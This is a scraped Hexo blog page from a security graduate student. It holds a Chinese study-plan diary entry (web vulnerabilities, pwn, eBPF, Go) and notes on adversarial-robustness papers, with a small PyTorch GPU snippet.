      <a class="p-name article-title" href="/2023/03/08/2023-03-08-WorkForWork/">研二</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="3-8"><a href="#3-8" class="headerlink" title="3.8"></a>3.8</h2><p>不知不觉又是周三了，今天把 php 差不多过了一遍，其他也没干啥。</p>
<p>之后几天早上的话就是先研究一个 ai 检测漏洞 的论文，感觉复现很简单，我去试试</p>
<p>然后明天把老师给我的建议都改了发给老师，然后大规模改一下就能发了，争取下周吧</p>
<p>打算中午就专注于 Web 了，尤其是逻辑漏洞，sql、xss、upload 跟着靶场来一遍就算了，不打算折腾了</p>
<p>下午的话还是 pwn 的复现，其实现在还是找不到什么方向，感觉 ebpf 可以，但是挖洞又很难，可以再观察两天，这周五就得定，时间好紧张</p>
<p>晚上的话就是算法和项目，自己算法以后一天一道题，项目先以 go 为主，这周把 gee 看完</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/03/08/2023-03-08-WorkForWork/" data-id="cuidoGGzA3ebnfAsmTk_O4Pua" data-title="研二" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chat/" rel="tag">chat</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2022-03-21-note" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/01/04/2022-03-21-note/" class="article-date">
  <time class="dt-published" datetime="2022-01-04T14:18:21.000Z" itemprop="datePublished">2022-01-04</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/AI/">AI</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/01/04/2022-03-21-note/">Bad pen is better than good brain</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Paper-notes"><a href="#Paper-notes" class="headerlink" title="Paper notes"></a>Paper notes</h2><blockquote>
<p>Y. Xu, B. Du and L. Zhang, “Self-Attention Context Network: Addressing the Threat of Adversarial Attacks for Hyperspectral Image Classification,” in IEEE Transactions on Image Processing, vol. 30, pp. 8671-8685, 2021, doi: 10.1109&#x2F;TIP.2021.3118977.</p>
</blockquote>
<p>这篇文章提出了一个自注意力全局上下文的网络,用来提高高光谱图像分割的鲁棒性.整体思路就是把图片空间信息记下来,周围像素点损失函数加到自己的损失函数上,这样使得图片的扰动必须更大才能使得分类出错.</p>
<blockquote>
<p>A. Arnab, O. Miksik and P. H. S. Torr, “On the Robustness of Semantic Segmentation Models to Adversarial Attacks,” in IEEE Transactions on Pattern Analysis and Machine Intelligence, vol. 42, no. 12, pp. 3040-3053, 1 Dec. 2020, doi: 10.1109&#x2F;TPAMI.2019.2919707.</p>
</blockquote>
<p>这篇文章把对抗样本和图像分割联系起来了,之前我看的东西全是图片分类的,我没想到差距这么大:比如对抗样本的可迁移性在图像分割中就很差很差.</p>
<blockquote>
<p>Xu Y ,  Du B ,  Zhang F , et al. Hyperspectral image classification via a random patches network[J]. ISPRS Journal of Photogrammetry and Remote Sensing, 2018, 142(AUG.):344-357.</p>
</blockquote>
<p>这个就是自己太菜了,之前没学过高光谱分割,然后就看了一篇比较经典的分割算法,提出的是随机块的概念.感觉挺神奇的,就是把原始图片的某些随机块做成了卷积层然后卷积,之后来了几个 PCA 和白化.这就是一层干的事,然后它加了好几层,之后把结果堆叠到一起了,效果竟然出奇的好.它的数学原理就是一定存在某些低维,能够把高维空间的点全部投影过来.</p>
<h2 id="Use-your-gpu"><a href="#Use-your-gpu" class="headerlink" title="Use your gpu"></a>Use your gpu</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">model.cuda()</span><br><span class="line">loss_fn.cuda()</span><br><span class="line">data.cuda() #includa train data and test data</span><br><span class="line">torch.save(Model, &#x27;somename.pkl&#x27;)</span><br><span class="line">Model = torch.load(&#x27;somename.pkl&#x27;)</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/04/2022-03-21-note/" data-id="cuidiRzxBhO1DhCav9hLk9KMv" data-title="Bad pen is better than good brain" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/10/01/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
          </li>
        
          <li>
            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
          </li>
        
          <li>
            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
          </li>
        
          <li>
            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>